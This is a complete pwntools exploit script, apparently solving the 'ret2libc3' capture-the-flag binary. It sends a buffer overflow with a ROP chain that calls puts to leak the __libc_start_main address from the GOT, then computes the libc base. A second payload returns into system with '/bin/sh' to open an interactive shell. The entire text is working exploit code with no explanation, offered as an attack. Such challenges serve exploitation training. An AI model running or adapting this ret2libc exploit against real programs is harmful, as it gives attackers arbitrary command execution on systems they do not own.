from pwn import *

elf_ret2libc3 = ELF("./ret2libc3")
elf_libc = ELF("./libc.so")
sh = process("./ret2libc3")
plt_puts = elf_ret2libc3.plt["puts"]
got_libc_start_main = elf_ret2libc3.got["__libc_start_main"]
addr_start = elf_ret2libc3.symbols["_start"]
offset = 0x6C + 4
payload1 = flat(
    [
        b"A" * offset,
        plt_puts,
        addr_start,
        got_libc_start_main,
    ]
)
print(sh.recv())
sh.sendafter(
    b"No surprise anymore, system disappeard QQ.\nCan you find it !?",
    payload1,
    timeout=0.1,
)
libc_start_main_addr = u32(sh.recv()[0:4])
print("libc_start_main_addr: ", hex(libc_start_main_addr))
lib_base = libc_start_main_addr - elf_libc.symbols["__libc_start_main"]
addr_system = lib_base + elf_libc.symbols["system"]
addr_bin_sh = lib_base + next(elf_libc.search(b"/bin/sh"))
payload2 = flat(
    [
        b"A" * offset,
        addr_system,
        0xDEADBEEF,
        addr_bin_sh,
    ]
)
sh.sendline(payload2)
sh.interactive()
